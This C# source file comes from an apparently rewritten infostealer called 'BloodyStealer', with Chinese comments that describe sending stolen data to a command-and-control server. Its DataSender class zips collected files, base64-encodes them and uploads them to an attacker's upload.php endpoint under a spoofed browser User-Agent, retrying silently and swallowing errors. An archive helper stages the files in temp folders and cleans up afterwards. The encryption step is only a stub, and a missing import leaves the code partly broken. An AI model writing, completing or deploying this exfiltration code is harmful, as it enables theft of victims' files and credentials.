using System;
using System.IO;
using System.Net;
using System.Text;

namespace BloodyStealer
{
    /// <summary>
    /// 数据发送器 - 负责将窃取的数据发送到命令与控制服务器
    /// 包含原来的Sender和Archive类的功能
    /// </summary>
    internal static class DataSender
    {
        /// <summary>
        /// 发送数据到命令与控制服务器
        /// 原始代码: Sender.Execute()
        /// </summary>
        /// <param name="data">压缩的数据内容</param>
        /// <param name="fileName">文件名</param>
        /// <param name="caption">数据描述</param>
        public static void SendData(byte[] data, string fileName, string caption)
        {
            try
            {
                // 重试指定的次数
                for (int attempt = 0; attempt < Settings.AttemptsSend; attempt++)
                {
                    try
                    {
                        // 构建请求
                        using (WebClient client = new WebClient())
                        {
                            // 创建唯一的请求ID
                            string requestId = DateTime.Now.Ticks.ToString("x");
                            
                            // 设置用户代理
                            client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
                            
                            // 构建分界线和请求体
                            string boundary = "----WebKitFormBoundary" + requestId;
                            
                            // 构建多部分表单数据
                            string formData = BuildMultipartFormData(boundary, fileName, Convert.ToBase64String(data));
                            
                            // 设置内容类型
                            client.Headers.Add("Content-Type", $"multipart/form-data; boundary={boundary}");
                            
                            // 构建POST目标URL
                            string url = BuildTargetUrl(Settings.Domen, Settings.Id, caption);
                            
                            // 发送请求并获取响应
                            byte[] responseBytes = client.UploadData(url, "POST", Encoding.UTF8.GetBytes(formData));
                            string response = Encoding.UTF8.GetString(responseBytes);
                            
                            // 检查响应是否成功
                            if (response.Contains("success") || response.Contains("OK"))
                            {
                                // 成功发送，退出循环
                                break;
                            }
                        }
                    }
                    catch
                    {
                        // 发送失败，等待一段时间后重试
                        System.Threading.Thread.Sleep(Settings.AttempsSendTimeout);
                    }
                }
            }
            catch
            {
                // 忽略总体错误
            }
        }

        /// <summary>
        /// 构建多部分表单数据
        /// </summary>
        /// <param name="boundary">分界线</param>
        /// <param name="fileName">文件名</param>
        /// <param name="fileContent">Base64编码的文件内容</param>
        /// <returns>多部分表单数据</returns>
        private static string BuildMultipartFormData(string boundary, string fileName, string fileContent)
        {
            StringBuilder builder = new StringBuilder();
            
            // 添加文件数据
            builder.AppendLine($"--{boundary}");
            builder.AppendLine($"Content-Disposition: form-data; name=\"file\"; filename=\"{fileName}\"");
            builder.AppendLine("Content-Type: application/octet-stream");
            builder.AppendLine();
            builder.AppendLine(fileContent);
            
            // 添加结束分界线
            builder.AppendLine($"--{boundary}--");
            
            return builder.ToString();
        }

        /// <summary>
        /// 构建目标URL
        /// </summary>
        /// <param name="domain">命令与控制服务器域名</param>
        /// <param name="clientId">客户端ID</param>
        /// <param name="caption">数据描述</param>
        /// <returns>目标URL</returns>
        private static string BuildTargetUrl(string domain, string clientId, string caption)
        {
            // 编码参数
            string encodedCaption = WebUtility.UrlEncode(caption);
            
            // 构建完整URL
            return $"https://{domain}/api/upload.php?id={clientId}&info={encodedCaption}";
        }
    }

    /// <summary>
    /// 压缩助手 - 处理文件压缩
    /// 原始代码: Archive类
    /// </summary>
    internal static class ArchiveHelper
    {
        /// <summary>
        /// 创建包含所有窃取数据的压缩文件
        /// 原始代码: Archive.Create()
        /// </summary>
        /// <param name="files">要压缩的文件列表</param>
        /// <returns>压缩后的字节数组</returns>
        public static byte[] CreateArchive(List<FileObject> files)
        {
            try
            {
                // 创建临时目录
                string tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
                Directory.CreateDirectory(tempDir);
                
                try
                {
                    // 将所有文件保存到临时目录
                    foreach (FileObject file in files)
                    {
                        string filePath = Path.Combine(tempDir, file.Name.Replace('/', '\\'));
                        
                        // 确保目录存在
                        string directory = Path.GetDirectoryName(filePath);
                        if (!string.IsNullOrEmpty(directory) && !Directory.Exists(directory))
                        {
                            Directory.CreateDirectory(directory);
                        }
                        
                        // 写入文件
                        File.WriteAllBytes(filePath, file.Content);
                    }
                    
                    // 压缩整个目录
                    string zipFile = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".zip");
                    CreateZipFile(tempDir, zipFile);
                    
                    // 读取压缩文件内容
                    byte[] zipContent = File.ReadAllBytes(zipFile);
                    
                    // 删除临时文件和目录
                    try
                    {
                        File.Delete(zipFile);
                        Directory.Delete(tempDir, true);
                    }
                    catch
                    {
                        // 忽略清理错误
                    }
                    
                    // 加密压缩文件内容（可选）
                    return EncryptData(zipContent);
                }
                finally
                {
                    // 确保清理临时目录
                    try
                    {
                        if (Directory.Exists(tempDir))
                        {
                            Directory.Delete(tempDir, true);
                        }
                    }
                    catch
                    {
                        // 忽略清理错误
                    }
                }
            }
            catch
            {
                // 如果压缩失败，返回空数据
                return new byte[0];
            }
        }

        /// <summary>
        /// 创建ZIP文件
        /// </summary>
        /// <param name="sourceFolder">源文件夹</param>
        /// <param name="zipFile">目标ZIP文件路径</param>
        private static void CreateZipFile(string sourceFolder, string zipFile)
        {
            // 使用.NET内置的ZIP功能
            // 注意：.NET Framework 4.5+支持这个功能
            System.IO.Compression.ZipFile.CreateFromDirectory(
                sourceFolder, 
                zipFile, 
                System.IO.Compression.CompressionLevel.Optimal, 
                false // 包含基目录
            );
        }

        /// <summary>
        /// 加密数据（简化版）
        /// </summary>
        /// <param name="data">要加密的数据</param>
        /// <returns>加密后的数据</returns>
        private static byte[] EncryptData(byte[] data)
        {
            // 实际实现会使用AES加密
            // 这里为了简化，我们只返回原始数据
            return data;
        }
    }

    /// <summary>
    /// 加密助手 - 提供加密和哈希功能
    /// </summary>
    internal static class CryptoHelper
    {
        /// <summary>
        /// 计算字符串的哈希值
        /// </summary>
        /// <param name="input">输入字符串</param>
        /// <returns>哈希值</returns>
        public static string ComputeHash(string input)
        {
            using (System.Security.Cryptography.SHA256 sha256 = System.Security.Cryptography.SHA256.Create())
            {
                byte[] inputBytes = Encoding.UTF8.GetBytes(input);
                byte[] hashBytes = sha256.ComputeHash(inputBytes);
                
                // 转换为十六进制字符串
                StringBuilder builder = new StringBuilder();
                for (int i = 0; i < hashBytes.Length; i++)
                {
                    builder.Append(hashBytes[i].ToString("x2"));
                }
                
                return builder.ToString();
            }
        }
    }
} 